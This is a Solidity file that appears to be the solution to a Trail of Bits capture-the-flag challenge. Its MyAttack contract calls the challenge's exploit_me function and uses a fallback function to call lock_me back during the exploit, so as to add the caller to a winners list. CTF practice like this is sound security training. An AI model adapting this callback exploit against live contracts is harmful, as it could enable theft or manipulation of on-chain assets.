pragma solidity 0.8.10;

// The goal of this challenge is to be able to sign offchain a message
// with an address stored in winners.

contract challengeInterface{
    function exploit_me(address winner) public{}
    function lock_me() public{}
}

contract MyAttack{    
		//trail of bits challenge addr: 0xcD7AB80Da7C893f86fA8deDDf862b74D94f4478E
    address chAddress = 0xA7C761326CD1A42942Cb6703369F18155191F37c;
    challengeInterface public challengeContract = challengeInterface(chAddress);
    fallback() external{
        challengeContract.lock_me();
    }
    function attack() external {
        challengeContract.exploit_me(msg.sender);
    }
}